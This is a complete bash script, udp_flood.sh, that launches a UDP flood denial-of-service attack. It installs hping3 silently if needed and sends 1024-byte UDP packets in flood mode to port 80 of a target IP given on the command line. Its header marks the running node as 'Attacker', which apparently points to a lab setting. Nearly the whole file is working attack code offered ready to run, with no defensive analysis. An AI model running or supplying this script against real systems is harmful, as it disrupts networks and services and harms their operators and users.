#!/bin/bash
# =============================================================================
# udp_flood.sh — UDP Flood Attack
# Target Node: Attacker
# =============================================================================
# Usage: ./udp_flood.sh <TARGET_IP>
#
# Sends a massive number of UDP packets with random payloads.
# The target must process each packet, consuming resources.
# Uses hping3 for consistent flood rate.
#
# Press Ctrl+C to stop the attack.
# =============================================================================

TARGET_IP="$1"

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <TARGET_IP>"
    echo "Example: $0 192.168.1.1"
    exit 1
fi

# Install hping3 if not present
which hping3 > /dev/null 2>&1 || { echo "[*] Installing hping3..."; apt-get update -qq && apt-get install -y -qq hping3 > /dev/null 2>&1; }

echo "============================================================"
echo "  UDP FLOOD ATTACK"
echo "============================================================"
echo "  Target:  $TARGET_IP:80"
echo "  Method:  UDP packets with random data (--flood mode)"
echo "  Effect:  Consumes bandwidth and target resources"
echo ""
echo "  Press Ctrl+C to stop the attack."
echo "============================================================"
echo ""
echo "[*] Starting UDP flood..."

hping3 --udp --flood -p 80 --data 1024 "$TARGET_IP"
